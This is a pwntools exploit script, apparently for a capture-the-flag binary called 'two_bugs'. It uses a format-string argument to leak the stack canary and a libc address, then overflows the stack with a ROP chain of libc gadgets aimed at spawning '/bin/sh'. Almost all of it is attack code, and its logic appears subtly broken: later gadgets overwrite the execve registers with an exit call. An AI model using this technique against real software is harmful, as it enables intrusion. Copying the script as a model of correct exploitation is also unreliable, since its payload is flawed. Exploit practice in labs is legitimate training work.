#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./two_bugs", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    list = ['%17$p%19$p']

    io = start(list)

    # add your exploit code here
    leak = io.recv()
    canary = leak[0:18]
    libc_base_address = leak[18:-1]
    print(canary)
    print(libc_base_address)
    
    offset = b'1eb000'
    libc_rw_address = hex(int(libc_base_address, 16) + int(offset, 16))
    print(libc_rw_address)

    bytes_until_ret = 64

    sys_write = 1
    sys_exit = 60
    stdout = 1
    exit_code = 0

    command = b"/bin/sh\x00"

    payload = b"A" * bytes_until_ret

    gadget_mov = p64(int(libc_base_address, 16) + 0x2e19c)
    gadget_pop_rax = p64(int(libc_base_address, 16) + 0x33544)
    gadget_pop_rdi = p64(int(libc_base_address, 16) + 0x21102)
    gadget_pop_rsi = p64(int(libc_base_address, 16) + 0x202e8)
    gadget_pop_rdx = p64(int(libc_base_address, 16) + 0x1b92)
    gadget_sysenter = p64(int(libc_base_address, 16) + 0xbc375)

    payload += p64(int(canary, 16), endian = "big")
    payload += p64(int(canary, 16) + 0x28, endian = "big")
    payload += gadget_pop_rdx
    payload += p64(int(libc_rw_address, 16))
    payload += gadget_pop_rax
    payload += command
    payload += gadget_mov

    # prepare registers
    payload += gadget_pop_rax
    payload += p64(59)
    payload += gadget_pop_rdi
    payload += command
    payload += gadget_pop_rsi
    payload += p64(0)
    payload += gadget_pop_rdx
    payload += p64(0)

    payload += gadget_pop_rdi
    payload += p64(exit_code)
    payload += gadget_pop_rax
    payload += p64(sys_exit)

    payload += gadget_sysenter

    print(payload)

    io.sendline(payload)

    io.interactive()



if __name__ == "__main__":
    main()
